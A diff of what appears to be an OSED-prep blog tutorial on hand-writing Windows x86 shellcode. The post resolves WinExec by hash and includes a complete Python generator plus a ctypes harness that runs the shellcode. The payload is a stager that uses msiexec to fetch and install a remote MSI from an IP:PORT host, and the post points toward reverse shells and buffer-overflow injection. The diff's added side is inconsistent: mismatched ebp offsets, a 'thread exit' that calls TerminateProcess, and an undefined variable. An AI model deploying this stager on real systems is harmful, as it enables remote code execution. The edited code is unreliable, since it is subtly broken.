@@ -14,7 +14,7 @@ Come on! It'll be _painfully_ fun! 🥲
 
 > [!WARNING] heads up!  
 > I'm no 1337 when it comes to binary exploitation. The thing is, I'm prepping for the OSED cert, and this article is a way of holding myself accountable to actually understand the concepts. 
-> This is the Feynman technique of studying: trying to teach somebody else[^3].
+> This is the [Feynman technique](https://en.wikipedia.org/wiki/Learning_by_teaching) of studying: trying to teach somebody else[^3].
 
 Enough yapping. Let's dive in! 🤿
 
@@ -22,11 +22,11 @@ Enough yapping. Let's dive in! 🤿
 
 At a high-level overview, our payload will do the following:
 
-1. locate `kernel32.dll` via the PEB (and pocket `ntdll.dll`'s base while we're at it).
-2. resolve functions like `WinExec()` or `RtlExitUserThread()` by hash.
+1. locate `kernel32.dll` via the PEB.
+2. resolve functions like `WinExec()` or `TerminateProcess()` by hash.
 3. build the command string like `"msiexec /i http://IP:PORT/rev.msi /qn"` on the stack.
 4. call `WinExec()` with that command.
-5. exit the current thread gracefully with `RtlExitUserThread()`.
+5. exit the current thread gracefully with `TerminateProcess()`.
 
 Let's go into detail, step by step.
 
@@ -44,7 +44,7 @@ Explanation:
 
 - `mov ebp, esp`. Saving `esp` to `ebp`. Why? `esp` points to the top of the stack, \*but\* it changes every time we push or call stuff. So we save it in `ebp` and *never touch it*. Every function address or piece of data we want to keep will get stored at a fixed offset *below* it (like `[ebp-0x10]`), so we can always find our goodies. And since we're about to shove `esp` way down, those negative offsets land in memory we've reserved for ourselves.
 
-- `add esp, 0xfffff9f0`. Wait, \*adding\*? Yep: to the CPU, adding `0xfffff9f0` is the same as subtracting `0x610`. So `esp` slides down ~1.5KB. Two wins: everything between the new `esp` and `ebp` becomes a scratch pad. That's where our `[ebp-0x...]` bookmarks will live.
+- `add esp, 0xfffff9f0`. Wait, \*adding\*? Yep: to the cpu, adding `0xfffff9f0` is the same as subtracting `0x610`. So `esp` slides down ~1.5KB. Two wins: everything between the new `esp` and `ebp` becomes a scratch pad. That's where our `[ebp-0x...]` bookmarks will live.
 
 But:
 
@@ -78,24 +78,19 @@ The asm below walks the module chain until it finds one whose name is exactly 12
 
 ```nasm
 find_kernel32:
-    xor ecx,ecx                  ; ECX = 0
-    mov esi,fs:[ecx+30h]         ; ESI = PEB
-    mov esi,[esi+0Ch]            ; ESI = PEB->Ldr
-    mov esi,[esi+1Ch]            ; ESI = Ldr.InInitOrder
-    mov ebx,[esi+8h]             ; EBX = base of 1st entry = ntdll.dll
-    mov [ebp-0x14],ebx           ; stash ntdll's base: we need it in step 4
+    xor ecx,ecx                     ; ecx = 0
+    mov esi,fs:[ecx+30h]            ; esi = &(PEB) ([FS:0x30])
+    mov esi,[esi+0Ch]               ; esi = PEB->Ldr
+    mov esi,[esi+1Ch]               ; esi = PEB->Ldr.InInitOrder
 next_module:
-    mov ebx, [esi+8h]            ; EBX = module base address
-    mov edi, [esi+20h]           ; EDI = module name (wide chars)
-    mov esi, [esi]               ; ESI = next entry
-    cmp [edi+12*2], cx           ; name[12] == 0x00 ?
-    jne next_module              ; no -> keep walking
+    mov ebx, [esi+8h]               ; ebx = InInitOrder[X].base_address
+    mov edi, [esi+20h]              ; edi = InInitOrder[X].module_name
+    mov esi, [esi]                  ; esi = InInitOrder[X].flink (next)
+    cmp [edi+12*2], cx              ; (unicode) modulename[12] == 0x00?
+    jne next_module                 ; No? try next module.
 ```
 
 Names are utf-16, so `12*2 = 24` bytes in is the 13th character. If it's null, the name is exactly 12 characters. So this loop exits with **ebx = kernel32 base address**.
-
-> [!NOTE] 
-> the *first* entry in the `InInitializationOrder` list is `ntdll.dll`, so before we start walking we grab its base and save it at `[ebp-0x14]`. We'll need it in step 4 to resolve `RtlExitUserThread` straight from `ntdll`[^4].
 
 But:
 
@@ -278,15 +273,16 @@ find_function:
 #### the loop
 
 ```nasm
-find_function_loop:
-    jecxz find_function_finished    ; counter is 0? bail out
-    dec ecx
-    mov eax, [ebp-4]                ; reload AddressOfNames VMA
-    mov esi, [eax+ecx*4]            ; RVA of the ecx-th name
-    add esi, ebx                    ; VMA of the name
-    xor eax, eax                    ; zero eax...
-    cdq                             ; ...so cdq zeroes edx for free
-    cld                             ; make lodsb walk forward
+find_function_loop:                   
+    jecxz find_function_finished    ; Jump to the end if ECX is 0
+    dec ecx                         ; Decrement our names counter
+    mov eax, [ebp-4]                ; Restore AddressOfNames VMA
+    mov esi, [eax+ecx*4]            ; Get the RVA of the symbol name
+    add esi, ebx                    ; Set ESI to the VMA of the current
+compute_hash:                         
+    xor eax, eax                    ; NULL EAX
+    cdq                             ; NULL EDX
+    cld                             ; Clear direction
 ```
 
 We walk it *backwards*; `ecx*4` because every entry is a 4-byte pointer. `jecxz` is just "jump if ecx is zero", our exit if we run out of names without a match.
@@ -355,48 +351,22 @@ find_function_finished:
 
 Check the layout again. `esp+0x1c` is the eax that `pushad` saved. We literally *hack our result into the stack snapshot* before restoring it. Then `popad` pulls everything back; and `eax` comes out carrying the function address, all other registers untouched, like nothing ever happened. The result gets smuggled out through the stack. Beautiful.
 
-Using it looks like:
-
-```nasm
-    push 0xec0e4e8e                 ; ROR13 hash of "LoadLibraryA"
-    call dword ptr [ebp-0x08]       ; find_function
-                                    ; (ebx = kernel32 base on the way in)
-                                    ; eax = LoadLibraryA address. boom.
-```
-
-`LoadLibraryA` is just the canonical example; this particular stager doesn't need it, since `WinExec` and `RtlExitUserThread` live in dlls that are already loaded. But now you know how you'd get it.
-
 Next step: learning how to call our new function.
 
 ## step 4: resolving symbols
 
-Now we resolve the functions we actually want, using the resolver plus the ror13 technique from step 2:
+Now we resolve the functions we actually want, using the resolver plus the ror13 technique from [step 2](#step-2-winapi-function-hashing):
 
 ```nasm
 resolve_symbols:
     push 0x0E8AFE98                 ; ror13 hash of "WinExec"
     call dword ptr [ebp-0x08]       ; find_function
     mov  [ebp-0x0C], eax            ; save WinExec
-
-    push 0x8521A2EF                 ; ror13 hash of "RtlExitUserThread"
-    mov  ebx, [ebp-0x14]            ; ebx = ntdll base (stashed in step 1)
-    call dword ptr [ebp-0x08]       ; find_function
-    mov  [ebp-0x10], eax            ; save RtlExitUserThread
 ```
 
-Note that `ebx` is the dll base the resolver walks. After the module walk it still holds `kernel32`, so `WinExec` resolves first, no setup needed. Then we swap in the ntdll base we pocketed in [step 1](#step-1-psst-psst-kernel32-where-are-you) and resolve `RtlExitUserThread` from there.
+Note that `ebx` is the dll base the resolver walks. After the module walk it still holds `kernel32`, so `WinExec` resolves first, no setup needed. 
 
-Then we save each pointer at a different offset from `ebp` for future reference. The full map so far:
-
-| offset       | contents                    | saved in |
-|--------------|-----------------------------|----------|
-| `[ebp-0x14]` | ntdll base                  | [step 1](#step-1-psst-psst-kernel32-where-are-you)   |
-| `[ebp-0x10]` | ntdll!RtlExitUserThread     | here     |
-| `[ebp-0x0C]` | kernel32!WinExec            | here     |
-| `[ebp-0x08]` | find_function               | [step 3](#step-3-walking-the-export-table)   |
-| `[ebp-0x04]` | scratch: AddressOfNames VMA | [step 3](#step-3-walking-the-export-table)   |
-
-All negative offsets: that's the ~1.5KB of room we reserved in [step 0](#step-0-reserve-stack-space) doing its job.
+Then we save each pointer at a different offset from `ebp` for future reference. All negative offsets: that's the ~1.5KB of room we reserved in [step 0](#step-0-reserve-stack-space) doing its job.
 
 ## step 5: stacking strings like lego blocks
 
@@ -434,7 +404,7 @@ The hack is to write to `al` or `ax` since it only touches the bottom of `eax`. 
 > [!WARNING]
 > Since the upper bytes are garbage, you must zero eax first (`xor eax, eax`) or your string on the stack won't be null-terminated and will have junk in it.
 
-Let's review the `cmd` example with this strategy. After all the pushes, memory starting at `esp` must read `63 6d 64` ("cmd")[^5].
+Let's review the `cmd` example with this strategy. After all the pushes, memory starting at `esp` must read `63 6d 64` ("cmd")[^4].
 
 ```nasm
 xor eax, eax        ; zero eax first: remember the warning above!
@@ -453,6 +423,8 @@ esp+3 →  00 00 00         ← null terminator, for free
 ```
 
 Yay! We did it! 🎉 Now, let's review how to do this dynamically.
+
+### pushing strings in python
 
 Again, [this epi052 helper](https://github.com/epi052/osed-scripts/blob/main/shellcoder.py#L47-L78) converts a string to a sequence of `push` instructions:
 
@@ -503,14 +475,11 @@ After `WinExec()` returns, we exit the current *thread* gracefully:
 
 ```nasm
 exec_shellcode:
-    xor eax, eax
-    push eax                        ; exit code 0
-    call dword ptr [ebp-0x10]       ; ntdll!RtlExitUserThread(0)
+    xor ecx, ecx                    ; null ECX
+    push ecx                        ; uExitCode
+    push 0xffffffff                 ; hProcess
+    call dword ptr [ebp+0x10]       ; Call TerminateProcess
 ```
-
-Why not `kernel32!ExitThread` or `kernel32!TerminateProcess`? On win8+, a bunch of kernel32 exports are *forwarded* to other dlls: `kernel32!ExitThread` is a forwarder to `ntdll!RtlExitUserThread`, and a lot of kernel32's API surface now actually lives in kernelbase. 
-
-Our hash resolver returns the address of the forwarder *string*, not code, so a forwarded export hands us a pointer to garbage. `ntdll` never forwards exports, so we resolve `RtlExitUserThread` directly from there (that's why we pocketed ntdll's base back in [step 1](#step-1-psst-psst-kernel32-where-are-you))[^6]. 
 
 ## final code
 
@@ -552,6 +521,8 @@ def push_string(input_string):
 
     instructions = []
     first_instructions = []
+    null_terminated = False
+
     for i in range(rev_hex_payload_len, 0, -1):
         if (i != 0) and ((i % 8) == 0):
             target_bytes = rev_hex_payload[i - 8:i]
@@ -579,6 +550,8 @@ def push_string(input_string):
                     f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};"
                 )
                 first_instructions.append("push ax;")
+            null_terminated = True
+
     instructions = first_instructions + instructions
     return "".join(instructions)
 
@@ -591,95 +564,93 @@ def exec_cmd(command, breakpoint=0):
     """
     push_instr_winexec_hash = push_function_hash("WinExec")
     push_instr_command = push_string(command)
-    push_instr_exitthread_hash = push_function_hash("RtlExitUserThread")
+    push_instr_terminate_hash = push_function_hash("TerminateProcess")
 
     asm = [
         "   start:                               ",
         f"{['', 'int3;'][breakpoint]}            ",
-        "       mov ebp, esp                     ;",
-        "       add esp, 0xfffff9f0              ;",  # avoid NULL bytes
+        "       mov ebp, esp                    ;",  #
+        "       add esp, 0xfffff9f0             ;",  # Avoid NULL bytes
         "   find_kernel32:                       ",
-        "       xor ecx, ecx                     ;",
-        "       mov esi, fs:[ecx + 0x30]         ;",  # PEB
-        "       mov esi, [esi + 0x0C]            ;",  # PEB->Ldr
-        "       mov esi, [esi + 0x1C]            ;",  # InInitOrder
-        "       mov ebx, [esi + 0x08]            ;",  # 1st entry = ntdll.dll
-        "       mov [ebp - 0x14], ebx            ;",  # save ntdll base
+        "       xor ecx,ecx                     ;",  # ECX = 0
+        "       mov esi,fs:[ecx+30h]            ;",  # ESI = &(PEB) ([FS:0x30])
+        "       mov esi,[esi+0Ch]               ;",  # ESI = PEB->Ldr
+        "       mov esi,[esi+1Ch]               ;",  # ESI = PEB->Ldr.InInitOrder
         "   next_module:                         ",
-        "       mov ebx, [esi + 0x08]            ;",  # base address
-        "       mov edi, [esi + 0x20]            ;",  # module name
-        "       mov esi, [esi]                   ;",  # next
-        "       cmp word ptr [edi + 12*2], cx    ;",  # kernel32.dll?
-        "       jne next_module                  ;",
+        "       mov ebx, [esi+8h]               ;",  # EBX = InInitOrder[X].base_address
+        "       mov edi, [esi+20h]              ;",  # EDI = InInitOrder[X].module_name
+        "       mov esi, [esi]                  ;",  # ESI = InInitOrder[X].flink (next)
+        "       cmp [edi+12*2], cx              ;",  # (unicode) modulename[12] == 0x00?
+        "       jne next_module                 ;",  # No: try next module.
         "   find_function_shorten:               ",
-        "       jmp find_function_shorten_bnc    ;",
+        "       jmp find_function_shorten_bnc   ;",  # Short jump
         "   find_function_ret:                   ",
-        "       pop esi                          ;",
-        "       mov [ebp - 0x08], esi            ;",  # save find_function
-        "       jmp resolve_symbols              ;",
+        "       pop esi                         ;",  # POP the return address from the stack
+        "       mov [ebp+0x04], esi             ;",  # Save find_function address for later usage
+        "       jmp resolve_symbols             ;",  #
         "   find_function_shorten_bnc:           ",
-        "       call find_function_ret           ;",
+        "       call find_function_ret          ;",  # Relative CALL with negative offset
         "   find_function:                       ",
-        "       pushad                           ;",
-        "       mov eax, [ebx + 0x3C]            ;",  # e_lfanew
-        "       mov edi, [ebx + eax + 0x78]      ;",  # Export Directory RVA
-        "       add edi, ebx                     ;",  # Export Directory VMA
-        "       mov ecx, [edi + 0x18]            ;",  # NumberOfNames
-        "       mov eax, [edi + 0x20]            ;",  # AddressOfNames RVA
-        "       add eax, ebx                     ;",
-        "       mov [ebp - 4], eax               ;",
+        "       pushad                          ;",  # Save all registers from Base address of kernel32 is in EBX Previous step (find_kernel32)
+        "       mov eax, [ebx+0x3c]             ;",  # Offset to PE Signature
+        "       mov edi, [ebx+eax+0x78]         ;",  # Export Table Directory RVA
+        "       add edi, ebx                    ;",  # Export Table Directory VMA
+        "       mov ecx, [edi+0x18]             ;",  # NumberOfNames
+        "       mov eax, [edi+0x20]             ;",  # AddressOfNames RVA
+        "       add eax, ebx                    ;",  # AddressOfNames VMA
+        "       mov [ebp-4], eax                ;",  # Save AddressOfNames VMA for later
         "   find_function_loop:                  ",
-        "       jecxz find_function_finished     ;",
-        "       dec ecx                          ;",
-        "       mov eax, [ebp - 4]               ;",  # reload: eax is trashed below
-        "       mov esi, [eax + ecx*4]           ;",
-        "       add esi, ebx                     ;",
+        "       jecxz find_function_finished    ;",  # Jump to the end if ECX is 0
+        "       dec ecx                         ;",  # Decrement our names counter
+        "       mov eax, [ebp-4]                ;",  # Restore AddressOfNames VMA
+        "       mov esi, [eax+ecx*4]            ;",  # Get the RVA of the symbol name
+        "       add esi, ebx                    ;",  # Set ESI to the VMA of the current
         "   compute_hash:                        ",
-        "       xor eax, eax                     ;",
-        "       cdq                              ;",
-        "       cld                              ;",
+        "       xor eax, eax                    ;",  # NULL EAX
+        "       cdq                             ;",  # NULL EDX
+        "       cld                             ;",  # Clear direction
         "   compute_hash_again:                  ",
-        "       lodsb                            ;",
-        "       test al, al                      ;",
-        "       jz compute_hash_finished         ;",
-        "       ror edx, 0x0D                    ;",
-        "       add edx, eax                     ;",
-        "       jmp compute_hash_again           ;",
+        "       lodsb                           ;",  # Load the next byte from esi into al
+        "       test al, al                     ;",  # Check for NULL terminator
+        "       jz compute_hash_finished        ;",  # If the ZF is set, we've hit the NULL term
+        "       ror edx, 0x0d                   ;",  # Rotate edx 13 bits to the right
+        "       add edx, eax                    ;",  # Add the new byte to the accumulator
+        "       jmp compute_hash_again          ;",  # Next iteration
         "   compute_hash_finished:               ",
         "   find_function_compare:               ",
-        "       cmp edx, [esp + 0x24]            ;",
-        "       jnz find_function_loop           ;",
-        "       mov edx, [edi + 0x24]            ;",  # AddressOfNameOrdinals
-        "       add edx, ebx                     ;",
-        "       mov cx, [edx + 2*ecx]            ;",
-        "       mov edx, [edi + 0x1C]            ;",  # AddressOfFunctions
-        "       add edx, ebx                     ;",
-        "       mov eax, [edx + 4*ecx]           ;",
-        "       add eax, ebx                     ;",
-        "       mov [esp + 0x1C], eax            ;",
+        "       cmp edx, [esp+0x24]             ;",  # Compare the computed hash with the requested hash
+        "       jnz find_function_loop          ;",  # If it doesn't match go back to find_function_loop
+        "       mov edx, [edi+0x24]             ;",  # AddressOfNameOrdinals RVA
+        "       add edx, ebx                    ;",  # AddressOfNameOrdinals VMA
+        "       mov cx, [edx+2*ecx]             ;",  # Extrapolate the function's ordinal
+        "       mov edx, [edi+0x1c]             ;",  # AddressOfFunctions RVA
+        "       add edx, ebx                    ;",  # AddressOfFunctions VMA
+        "       mov eax, [edx+4*ecx]            ;",  # Get the function RVA
+        "       add eax, ebx                    ;",  # Get the function VMA
+        "       mov [esp+0x1c], eax             ;",  # Overwrite stack version of eax from pushad
         "   find_function_finished:              ",
-        "       popad                            ;",
-        "       ret                              ;",
+        "       popad                           ;",  # Restore registers
+        "       ret                             ;",  
         "   resolve_symbols:                     ",
-        push_instr_winexec_hash,                    # kernel32!WinExec
+        push_instr_winexec_hash,                     # kernel32!WinExec
         "       call dword ptr [ebp - 0x08]      ;",
         "       mov [ebp - 0x0C], eax            ;",
-        push_instr_exitthread_hash,                 # ntdll!RtlExitUserThread
-        "       mov ebx, [ebp - 0x14]            ;",  # ebx = ntdll base
-        "       call dword ptr [ebp - 0x08]      ;",
-        "       mov [ebp - 0x10], eax            ;",
+        push_instr_terminate_hash,                   # TerminateProcess hash
+        "       call dword ptr [ebp+0x04]       ;",  # Call find_function
+        "       mov [ebp - 0x10], eax             ;", # Save TerminateProcess address for later
         "   call_winexec:                        ",
         "       xor eax, eax                     ;",
-        "       push eax                         ;",  # null terminator
+        "       push eax                         ;", # null terminator
         push_instr_command,
-        "       mov eax, esp                     ;",  # lpCmdLine
-        "       push 5                           ;",  # uCmdShow (2nd arg pushed first)
-        "       push eax                         ;",  # lpCmdLine (1st arg pushed last)
-        "       call dword ptr [ebp - 0x0C]      ;",  # WinExec(lpCmdLine, uCmdShow)
+        "       mov eax, esp                     ;", # lpCmdLine
+        "       push 5                           ;", # uCmdShow (2nd arg pushed first)
+        "       push eax                         ;", # lpCmdLine (1st arg pushed last)
+        "       call dword ptr [ebp - 0x0C]      ;", # WinExec(lpCmdLine, uCmdShow)
         "   exec_shellcode:                      ",
-        "       xor eax, eax                     ;",
-        "       push eax                         ;",  # exit code 0
-        "       call dword ptr [ebp - 0x10]      ;",  # ntdll!RtlExitUserThread(0)
+        "       xor ecx, ecx                     ;",
+        "       push ecx                         ;", # uExitCode = 0
+        "       push 0xffffffff                  ;", # hProcess = -1 (current process)
+        "       call dword ptr [ebp - 0x10]      ;", # TerminateProcess(-1, 0)
     ]
 
     return "\n".join(asm)
@@ -722,39 +693,38 @@ if __name__ == "__main__":
         print("Shellcode hex:", shellcode.hex())
 
         if args.test_shellcode:
-            print("\n[+] Debugging shellcode ...")
-            kernel32 = ctypes.windll.kernel32
-            kernel32.VirtualAlloc.restype = ctypes.c_void_p
-            kernel32.CreateThread.restype = ctypes.c_void_p
+            print(f"\n[+] Debugging shellcode ...")
+            sh = b""
+            for e in encoding:
+                sh += struct.pack("B", e)
 
-            ptr = kernel32.VirtualAlloc(
-                ctypes.c_void_p(0),
-                ctypes.c_size_t(len(shellcode)),
-                ctypes.c_int(0x3000),           # MEM_COMMIT | MEM_RESERVE
-                ctypes.c_int(0x40),             # PAGE_EXECUTE_READWRITE
+            packed_shellcode = bytearray(sh)
+            ptr = ctypes.windll.kernel32.VirtualAlloc(
+                ctypes.c_int(0),
+                ctypes.c_int(len(packed_shellcode)),
+                ctypes.c_int(0x3000),
+                ctypes.c_int(0x40),
             )
-            buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
-            kernel32.RtlMoveMemory(
-                ctypes.c_void_p(ptr), buf, ctypes.c_size_t(len(shellcode))
+            buf = (ctypes.c_char * len(packed_shellcode)).from_buffer(packed_shellcode)
+            ctypes.windll.kernel32.RtlMoveMemory(
+                ctypes.c_int(ptr), buf, ctypes.c_int(len(packed_shellcode))
             )
             print("[=]   Shellcode located at address %s" % hex(ptr))
             input("...ENTER TO EXECUTE SHELLCODE...")
-            ht = kernel32.CreateThread(
-                ctypes.c_void_p(0),
-                ctypes.c_size_t(0),
-                ctypes.c_void_p(ptr),
-                ctypes.c_void_p(0),
+            ht = ctypes.windll.kernel32.CreateThread(
+                ctypes.c_int(0),
+                ctypes.c_int(0),
+                ctypes.c_int(ptr),
+                ctypes.c_int(0),
                 ctypes.c_int(0),
                 ctypes.pointer(ctypes.c_int(0)),
             )
-            kernel32.WaitForSingleObject(
-                ctypes.c_void_p(ht), ctypes.c_int(-1)  # INFINITE
-            )
+            ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
 ```
 
 ## step 7: test it
 
-As you may have noticed, I included the option to debug it directly from our win10 vm, via `VirtualAlloc()` and friends (with proper `c_void_p` pointer types, so it also behaves on 64-bit Python).
+As you may have noticed, I included the option to debug it directly from our win10 vm, via `VirtualAlloc()` and friends.
 
 We could just run `calc.exe`, but that would be boring. So let's use it as a stager.
 
@@ -775,16 +745,15 @@ OMG! It's alive! 🧟‍♂️
 
 ## bottom line
 
-That's pretty much it. We built a full position-independent stager from scratch. In some contexts, knowing what's under the hood is helpful, because your friend msfvenom won't work in every situation. Running shellcode vs. understanding it makes all the difference.
+That's pretty much it. We built a full position-independent stager from scratch. In some contexts, knowing what's under the hood is helpful, because your friend msfvenom won't work in every situation. Running shellcode vs. understanding it can makes the difference.
 
-What if you want a full revshell custom shellcode, not a stager? Well, you'd reach for `WSAConnect()`, `CreateProcessA()`, and friends. My priority in this article was to explore how to do the basic stuff. With this baseline, you can adapt it to other contexts[^7]: you now know how to load dlls, find functions, load their addresses, push args, call them dynamically, etc.
+What if you want a full revshell custom shellcode, not a stager? Well, you'd reach for `WSAConnect()`, `CreateProcessA()`, and friends. My priority in this article was to explore how to do the basic stuff. With this baseline, you can adapt it to other contexts[^5]: you now know how to load dlls, find functions, load their addresses, push args, call them dynamically, etc.
 
 Now go forth and pop those shells. And if you're also on the OSED journey, see you on the other side. 🐚
+
 
 [^1]: he uses `system()` from `msvcrt.dll`, and I just use `WinExec()` from `kernel32.dll` since that dll is already loaded.
 [^2]: I highly recommend checking out the rest of the scripts in his [osed-scripts](https://github.com/epi052/osed-scripts) repo. Pure gold.
 [^3]: so basically, here I'm explaining it to myself at a level of detail I'm comfortable with. I hope it matches yours as well.
-[^4]: the reason is in [step 6](#step-6-clean-exit), spoiler: forwarded exports.
-[^5]: remember that the stack grows **down**, so whatever you push **last** sits at the **lowest** address.
-[^6]: also, `RtlExitUserThread` ends the current *thread* rather than the whole process, which is exactly what we want inside the `CreateThread` test harness below, and polite behavior in general when your shellcode runs inside somebody else's process.
-[^7]: you could also use it as a custom revshell or inject the shellcode bytes in the context of a buffer overflow, for instance.
+[^4]: remember that the stack grows **down**, so whatever you push **last** sits at the **lowest** address.
+[^5]: you could also use it as a custom revshell or inject the shellcode bytes in the context of a buffer overflow, for instance.
